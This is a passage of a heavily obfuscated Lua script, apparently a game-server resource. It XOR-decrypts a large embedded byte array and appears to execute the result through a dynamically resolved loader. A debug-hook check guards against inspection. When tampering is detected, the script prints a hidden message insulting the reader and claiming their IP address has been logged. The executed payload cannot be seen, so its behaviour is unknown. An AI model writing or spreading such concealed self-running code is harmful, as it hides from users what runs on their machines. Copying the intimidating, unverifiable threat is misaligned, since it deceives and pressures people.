  31, 68, 120, 87, 115, 0, 111, 68, 21, 187, 180, 85, 83, 80, 29, 1, 48, 71, 7, 56, 117, 246, 107, 113, 117, 83, 78, 13,
  10, 39, 9, 85, 55, 92, 214, 97, 18, 73, 38, 115, 23, 65, 28, 18, 122, 113, 79, 104, 79, 75 },
  "hCsscvx07rdA5OUfpnl32gGLaw"); fCfoBfgOinzQZNPNUj2iWbv1gy0g6ZkOK6vqIsUatko7LIIu4qgFh2HkqcvM8ubYhKFY4eOb =
o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO; pIDIHyyutPslY5m7EQJgxBMWjLhLhfUapLFsdLYLs5FosmRjsA3in3SD =
o5fuNbvGAAVRiZiB7gWBRIdva6qCEz5J5JAJETsNmI6aXyr4A0LfeQ5kQcWQFqt53aGYIiYknO; mdxPoh2tn21qQ7PNeleii2OUYZlyg7HruYz74SIaYJ7EYpv8X4J48Cx1iWmJv =
pIDIHyyutPslY5m7EQJgxBMWjLhLhfUapLFsdLYLs5FosmRjsA3in3SD; tQsKiPX9brBYgHotyD67SKz7793IUdfpwIKqLJvvSFlkpFYe20ySLgEednkGnsIvt9Zx6 =
mdxPoh2tn21qQ7PNeleii2OUYZlyg7HruYz74SIaYJ7EYpv8X4J48Cx1iWmJv; oyg01aQEMbQZ4C7gqOEOVkLQXsjTArE9YzBGO6Zsv0bCn7hTROUd1g3EVtAgBRotsC =
tQsKiPX9brBYgHotyD67SKz7793IUdfpwIKqLJvvSFlkpFYe20ySLgEednkGnsIvt9Zx6; ax8vdNTkpRljxRibqSliR33K9MiEbaXFrP9ZWI5yq2r1EtZpBCxZFYtdCLWWx76 =
oyg01aQEMbQZ4C7gqOEOVkLQXsjTArE9YzBGO6Zsv0bCn7hTROUd1g3EVtAgBRotsC; awJt0mloN2pC0G646V5C8YvL8hJd8eQHfO2QBnw1RksApKL1EgovCDylOMa0tnhAsVHi =
ax8vdNTkpRljxRibqSliR33K9MiEbaXFrP9ZWI5yq2r1EtZpBCxZFYtdCLWWx76; iyYK3WyfvsUey0ArsItA1RinUpRp0Gkn83ONnRaM0Qpwnu1ekp9hz8fcCzgt =
awJt0mloN2pC0G646V5C8YvL8hJd8eQHfO2QBnw1RksApKL1EgovCDylOMa0tnhAsVHi; bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N =
iyYK3WyfvsUey0ArsItA1RinUpRp0Gkn83ONnRaM0Qpwnu1ekp9hz8fcCzgt; wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z = function(
  a)
  K, F = 2623024216763420, 16384 + 9096; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; kvf46ivDfqV57ZpYNTiqTmfje4atuR14gg7IIPdsIJmA58r8B7UtHxNuW99PKQUK4UDiADU3g = function(b)
  co = coroutine.create(b)
  qW4oS8QJJiPYyT0waUYSsBZzgDesxKbdD1yDtWT7GO2RIeMdz1sScvOPStn = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(qW4oS8QJJiPYyT0waUYSsBZzgDesxKbdD1yDtWT7GO2RIeMdz1sScvOPStn, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return qW4oS8QJJiPYyT0waUYSsBZzgDesxKbdD1yDtWT7GO2RIeMdz1sScvOPStn
end; hll6ZOF6xL2h4SMhGY5BkTItsVuR3g6YbrjmQgw9JtmOyVfhZl8dCEaGXukUoi = function(f, g)
  telIWtrg0tIk5zUDAVF7EhgEMatqzedXdhLeZcDm4YfDKTXeSmIBdlQEEWWzyK = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; dPfXWqRUITCjhykJlkivmXfWaqgTSq8kRoqfmJUk7yZfuqEJvk9t7b = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; oqmNWlBH9wgUKW71bewtUQOZamzry2rSt5exOTqe1aUuvNQZzLfHn12bolv2da = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      telIWtrg0tIk5zUDAVF7EhgEMatqzedXdhLeZcDm4YfDKTXeSmIBdlQEEWWzyK(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; dEMqunS7OmkcpSN20IPeglAQTG5O5yNgG8bcmG2VxphBFCu1tPIePLJs7 = function(p, n)
    jHOTuR30GYspNRGWRlK1oGgwHMOaR2cgdTJQoi4qXF3mifY4RQNgX8TFQT = ""
    for k, q in pairs(p) do jHOTuR30GYspNRGWRlK1oGgwHMOaR2cgdTJQoi4qXF3mifY4RQNgX8TFQT =
      jHOTuR30GYspNRGWRlK1oGgwHMOaR2cgdTJQoi4qXF3mifY4RQNgX8TFQT ..
      bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N
      [wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('B5') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('FA') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('70') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('03') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('5C') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('79')]
      [wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('65') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('BE') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('DB') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('70')](
      q) end
    ; n(jHOTuR30GYspNRGWRlK1oGgwHMOaR2cgdTJQoi4qXF3mifY4RQNgX8TFQT)
  end; dPfXWqRUITCjhykJlkivmXfWaqgTSq8kRoqfmJUk7yZfuqEJvk9t7b(f,
    function(r) oqmNWlBH9wgUKW71bewtUQOZamzry2rSt5exOTqe1aUuvNQZzLfHn12bolv2da(r, g,
        function(s) dEMqunS7OmkcpSN20IPeglAQTG5O5yNgG8bcmG2VxphBFCu1tPIePLJs7(s,
            function(t) if #kvf46ivDfqV57ZpYNTiqTmfje4atuR14gg7IIPdsIJmA58r8B7UtHxNuW99PKQUK4UDiADU3g(bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N[wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('D2') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('A1') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('DB') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('AA')]) == 1 then if bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N[wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('D2') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('A1') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('DB') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('AA')] == bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N[wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('E6') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('70') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('03') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('5C') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('FA')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N[wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('D2') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('A1') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('DB') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('AA')](t) then
                    bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N
                        [wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('D2') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('A1') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('DB') .. wNFxxalrJqtVD1maVzbkRkfqdJvOMyPKg8TG63BPb8uwgCD66LXRm7MrBeg3z('AA')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; hll6ZOF6xL2h4SMhGY5BkTItsVuR3g6YbrjmQgw9JtmOyVfhZl8dCEaGXukUoi(
{ 828, 840, 886, 802, 857, 744, 803, 1081, 1148, 1211, 871, 1129, 553, 601, 755, 1134, 972, 729, 1054, 1052, 607, 1095,
  567, 808, 1000, 1173, 579, 1076, 868, 1042, 585, 1077, 824, 919, 646, 1166, 702, 926, 593, 973, 811, 653, 1133, 1194,
  592, 975, 945, 754, 1064, 1058, 1153, 671, 1010, 837, 981, 549, 827, 977, 1009, 1018, 695, 937, 909, 1108, 590, 900,
  978, 615, 683, 928, 1035, 1104, 1114, 756, 874, 1149, 934, 658, 711, 920, 1021, 728, 806, 952, 781, 1122, 751, 583,
  1186, 686, 891, 604, 1043, 768, 1203, 1085, 620, 902, 845, 1096, 807, 785, 609, 1181, 947, 556, 1090, 1063, 804, 910,
  1162, 894, 731, 1049, 547, 901, 1197, 1015, 595, 1180, 635, 965, 969, 1069, 1053, 1208, 1187, 1083, 1184, 746, 931,
  887, 677, 1055, 859, 889, 988, 723, 687, 964, 1093, 641, 882, 999, 853, 869, 1151, 715, 1101, 847, 766, 1034, 786,
  1124, 1066, 643, 734, 985, 611, 1038, 1172, 883, 1047, 759, 994, 918, 656, 770, 698, 1127, 561, 787, 1060, 1175, 968,
  1039, 1028, 1072, 1103, 574, 1092, 849, 855, 921, 1154, 1188, 662, 795, 780, 1007, 618, 640, 1200, 982, 1126, 1004,
  865, 769, 956, 689, 823, 1182, 790, 572, 735, 1130, 668, 543, 724, 1212, 884, 614, 684, 1067, 617, 753, 822, 1086,
  1209, 1146, 1061, 1087, 892, 844, 1207, 1074, 1164, 669, 560, 1084, 851, 830, 1075, 613, 1030, 1190, 624, 1174, 717,
  1107, 1026, 714, 758, 974, 1116, 660, 897, 930, 1012, 1165, 878, 1155, 779, 562, 1078, 1143, 1102, 678, 834, 732, 570,
  722, 1131, 873, 725, 682, 843, 713, 637, 1156, 627, 1065, 796, 1176, 1157, 991, 1119, 719, 1201, 948, 551, 767, 712,
  1106, 856, 850, 875, 798, 571, 555, 816, 644, 1109, 1141, 794, 1178, 951, 935, 1029, 835, 745, 812, 1091, 625, 879,
  997, 1099, 848, 1189, 747, 705, 832, 1068, 949, 984, 716, 587, 831, 842, 954, 1079, 632, 904, 622, 573, 708, 862, 1167,
  1199, 726, 761, 880, 693, 1003, 1045, 673, 1205, 597, 1041, 854, 679, 600, 691, 1140, 846, 955, 979, 563, 836, 674,
  896, 961, 1121, 666, 1183, 821, 608, 670, 885, 861, 616, 1135, 602, 1048, 826, 699, 1080, 820, 1191, 1105, 1152, 544,
  814, 805, 1100, 986, 566, 1097, 737, 819, 1011, 576, 1185, 1020, 1089, 586, 852, 550, 1037, 813, 568, 1016, 1145, 1057,
  1210, 914, 664, 1150, 706, 1056, 631, 867, 929, 596, 801, 907, 1115, 942, 1169, 749, 598, 630, 1132, 1033, 967, 946,
  636, 663, 899, 690, 676, 661, 915, 701, 584, 1123, 710, 876, 792, 652, 922, 599, 774, 727, 863, 1147, 1040, 649, 1094,
  707, 970, 1017, 941, 943, 740, 1036, 1120, 680, 545, 933, 654, 818, 1013, 575, 1163, 692, 777, 932, 739, 1027, 1088,
  839, 1062, 1025, 554, 825, 1161, 694, 1098, 1138, 793, 906, 809, 558, 1177, 936, 610, 1112, 778, 1195, 923, 1171, 1118,
  577, 1196, 912, 1002, 776, 782, 1046, 659, 959, 989, 1136, 581, 1005, 709, 893, 993, 838, 962, 939, 762, 733, 1111,
  605, 817, 1193, 1059, 564, 738, 569, 925, 1170, 760, 672, 743, 1082, 647, 742, 1159, 730, 1032, 757, 783, 621, 548,
  810, 888, 966, 1051, 773, 578, 612, 898, 1024, 996, 791, 741, 775, 580, 940, -1, 114, 70, 60, 119, 29, 121, 16, 68, 24,
  37, 32, 37, 26, 22, 186, 118, 168, 69, 82, 19, 49, 21, 148, 82, 50, 16, 47, 22, 108, 102, 23, 85, 4, 107, 90, 85, 13,
  89, 68, 1, 39, 111, 36, 46, 41, 137, 39, 6, 21, 90, 120, 54, 5, 18, 40, 21, 21, 22, 16, 36, 124, 85, 76, 121, 23, 24,
  41, 111, 116, 89, 9, 84, 9, 103, 103, 122, 240, 24, 50, 8, 157, 35, 40, 27, 11, 28, 10, 111, 22, 49, 246, 133, 109, 11,
  96, 204, 215, 115, 2, 154, 102, 107, 217, 111, 77, 154, 34, 26, 251, 85, 90, 40, 93, 93, 193, 102, 103, 4, 118, 125,
  123, 59, 224, 90, 183, 117, 31, 90, 56, 37, 68, 102, 79, 113, 60, 1, 39, 36, 75, 53, 109, 98, 142, 0, 57, 151, 108, 83,
  41, 7, 23, 36, 38, 52, 215, 85, 20, 57, 108, 12, 27, 145, 53, 59, 0, 7, 54, 78, 20, 34, 33, 41, 56, 22, 52, 200, 39,
  35, 0, 24, 108, 92, 127, 107, 46, 83, 56, 81, 42, 52, 116, 86, 107, 97, 85, 44, 40, 115, 50, 97, 34, 57, 19, 75, 1,
  188, 82, 216, 42, 152, 107, 45, 4, 126, 22, 60, 107, 88, 24, 111, 102, 59, 50, 16, 38, 82, 93, 88, 144, 131, 56, 41,
  31, 112, 93, 78, 94, 102, 117, 23, 63, 141, 68, 115, 75, 48, 117, 5, 98, 82, 122, 97, 113, 7, 218, 1, 34, 71, 24, 1,
  39, 113, 116, 63, 61, 10, 113, 108, 85, 15, 36, 111, 138, 53, 82, 122, 90, 78, 107, 50, 9, 57, 29, 0, 35, 110, 213, 22,
  34, 51, 92, 36, 85, 0, 4, 92, 31, 33, 27, 121, 58, 90, 71, 117, 1, 47, 109, 49, 40, 53, 20, 81, 67, 105, 55, 2, 113,
  250, 97, 6, 24, 254, 77, 54, 24, 61, 19, 28, 26, 220, 20, 96, 12, 76, 218, 98, 76, 90, 46, 82, 99, 127, 23, 54, 23,
  104, 61, 93, 30, 85, 29, 41, 169, 82, 6, 85, 115, 29, 15, 93, 69, 15, 70, 121, 27, 60, 9, 48, 220, 37, 102, 63, 117,
  238, 202, 115, 96, 29, 67, 22, 82, 92, 16, 69, 207, 40, 72, 1, 110, 22, 34, 103, 26, 108, 58, 84, 108, 37, 74, 40, 95,
  15, 16, 37, 68, 9, 81, 160, 78, 57, 160, 108, 56, 97, 107, 116, 68, 4, 85, 117, 18, 116, 118, 19, 103, 31, 16, 34, 57,
  40, 85, 124, 82, 103, 55, 28, 39, 56, 115, 75, 76, 39, 68, 76, 70, 121, 103, 183, 28, 191, 53, 99, 218, 106, 19, 86, 5,
  36, 138, 92, 97, 70, 81, 75, 116, 113, 54, 68, 109, 5, 13, 60, 28, 5, 97, 39, 246, 90, 41, 197, 204, 93, 123, 32, 63,
  16, 94, 16, 64, 115, 77, 112, 87, 0, 43, 95, 86, 23, 2, 91, 72, 12, 103, 97, 99, 46, 116, 233, 43, 71, 30, 24, 1, 49,
  1, 8, 25, 116, 29, 69, 21, 40, 15, 107, 103, 72, 93, 109, 225, 114, 210, 107, 42, 30, 36, 91, 39, 115, 33, 77, 10, 39,
  103, 125, 127, 76, 81, 58, 35, 96, 7, 40, 39, 45, 85, 76, 88, 78, 16, 52, 127, 30, 113, 16, 39, 76, 119, 113, 78, 116,
  200, 82, 57, 76, 228, 85, 36, 37, 85, 62, 116, 67, 44, 64, 89, 207, 28, 67, 61, 101, 109, 15, 68, 97, 242, 88, 88, 34,
  108, 148, 36, 223, 54, 8, 71, 7, 72, 108, 63, 114, 103, 106, 100, 39, 16, 207, 68, 31, 51, 39, 19, 104, 64, 55, 83, 40,
  80, 25, 85, 118, 53, 33, 121, 7, 117, 122, 236, 14, 46, 66, 109, 35, 24, 11, 34, 84, 111, 5, 113, 142, 85, 40, 76, 40,
  0, 170, 71, 66, 93, 151, 106, 106, 103, 171, 109, 75, 78, 113, 32, 86 }, "dqSsQVULOTnlruuzMK8z7AGdGA"); g3y6TQ5Z9iljgrodymsuzUzUeHVEhYUEtI092tTLS0tgmFOIzYGKYylAA1GYv1eeRZAZ =
bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N; d62RiymZ5lhOmJp8TXNYvRQGBb1kAC8LkWNhdzzcX2sroKQM1L3SPPszcEniM0PSdsFWWSC2CxQ =
bqI467L8VhKBy9DgcF7f7O7rFlgXIvKS0W0VrCjXwb2xnsLpncSwqWbbDoqz8N; o1fLC0Mts0kkHsq6nutF0EGzMf1jCPd1Y1Ih3eXidaqLdDhQ9DFJrah71Yfx6srmjjRU3E1TV6 =
d62RiymZ5lhOmJp8TXNYvRQGBb1kAC8LkWNhdzzcX2sroKQM1L3SPPszcEniM0PSdsFWWSC2CxQ; f1aTBqgUl3xqvuDV7eF2jyuJ9KY8MqAm6xZI3c3spomChIthXr8eH =
o1fLC0Mts0kkHsq6nutF0EGzMf1jCPd1Y1Ih3eXidaqLdDhQ9DFJrah71Yfx6srmjjRU3E1TV6; qT74cwwYKBNPyDdACUCzWto03JL4DsgqIOxeDvYgkKnVzcyPrpK9z8U0bAUBP37TwICFjdDgqOI =
f1aTBqgUl3xqvuDV7eF2jyuJ9KY8MqAm6xZI3c3spomChIthXr8eH; sFKSWOtuKyTJNbprQw0PxHO6BSblKd10VimAzYPdG1ctaFRY1sT73piy =
qT74cwwYKBNPyDdACUCzWto03JL4DsgqIOxeDvYgkKnVzcyPrpK9z8U0bAUBP37TwICFjdDgqOI; sEMYfUGnDNjkIz9UB6K6NVAbD0nBl6jhhLhD3AjJ5VdpOayvTcXbEgaETHLY0MnTCNn =
sFKSWOtuKyTJNbprQw0PxHO6BSblKd10VimAzYPdG1ctaFRY1sT73piy; lHTNuYv1ateySJSwfrgnMI4wdrk0raKHORlRgYR5kZiPOi2E7sdrmiftCAQJ98v5RgvFHI7 =
sEMYfUGnDNjkIz9UB6K6NVAbD0nBl6jhhLhD3AjJ5VdpOayvTcXbEgaETHLY0MnTCNn; xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH =
lHTNuYv1ateySJSwfrgnMI4wdrk0raKHORlRgYR5kZiPOi2E7sdrmiftCAQJ98v5RgvFHI7; q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3 = function(
  a)
  K, F = 2056700489028334, 16384 + 7893; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; bp46eSOYHv2weekzt7bZb8zKKWTVn12YXurJ1Emyt3E3b39MpPL5R = function(b)
  co = coroutine.create(b)
  qfVovwNkmaryapw4UVAy9cUqNScTLIc3vOGXxswxX8wP6vDOTVbl3k = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(qfVovwNkmaryapw4UVAy9cUqNScTLIc3vOGXxswxX8wP6vDOTVbl3k, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return qfVovwNkmaryapw4UVAy9cUqNScTLIc3vOGXxswxX8wP6vDOTVbl3k
end; kyg0KYgxi8GQkIOOS9kyEYuwU2EAkQKypnZtzxasR4gNHg47jus60WVRK6t3aud9tXm = function(f, g)
  hGD1jFfLmkifAwMduGaIgA7GStpCEQjLf7h2GcdOXqzkjf1pqyGEf5fflOTK9 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; lNrBhYgjp14RBlAhqff23CvpDQxK54UKDrkp88KQTTQWzJ8yWVfOc2k22Kd3YfMWdB = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; v6AD5JTdIfwr2dRuSx4MoHUfobw0fYH2SktVolEve1yVIYUosDWe21 = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      hGD1jFfLmkifAwMduGaIgA7GStpCEQjLf7h2GcdOXqzkjf1pqyGEf5fflOTK9(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; rsC09dy48kcN5hh7ITxxkjRjYVUqTWjZrCNMQqkh2mBhEXcuLIbITrSoTck49 = function(p, n)
    tA0a4iCoSpbXFQbU3VNwewRkWaXXYk64ruwM8yhlE6IMIBGSjc9P = ""
    for k, q in pairs(p) do tA0a4iCoSpbXFQbU3VNwewRkWaXXYk64ruwM8yhlE6IMIBGSjc9P =
      tA0a4iCoSpbXFQbU3VNwewRkWaXXYk64ruwM8yhlE6IMIBGSjc9P ..
      xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH
      [q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('0D') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('EA') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('30') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('6B') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('BC') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('B1')]
      [q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('3D') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('8E') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('83') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('30')](
      q) end
    ; n(tA0a4iCoSpbXFQbU3VNwewRkWaXXYk64ruwM8yhlE6IMIBGSjc9P)
  end; lNrBhYgjp14RBlAhqff23CvpDQxK54UKDrkp88KQTTQWzJ8yWVfOc2k22Kd3YfMWdB(f,
    function(r) v6AD5JTdIfwr2dRuSx4MoHUfobw0fYH2SktVolEve1yVIYUosDWe21(r, g,
        function(s) rsC09dy48kcN5hh7ITxxkjRjYVUqTWjZrCNMQqkh2mBhEXcuLIbITrSoTck49(s,
            function(t) if #bp46eSOYHv2weekzt7bZb8zKKWTVn12YXurJ1Emyt3E3b39MpPL5R(xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH[q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('02') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('99') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('83') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('1A')]) == 1 then if xoOCl8VuMly9ViOB4P4OA2Cxebxya0rvSqbIJjTlpXjew9u3GbLp4rZH[q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('02') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('99') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('83') .. q844j6GhsnLFG4gbBkwp0QtOsH5lW0GiIwydFPiC4xwp0zxPLhpn3('1A')] == 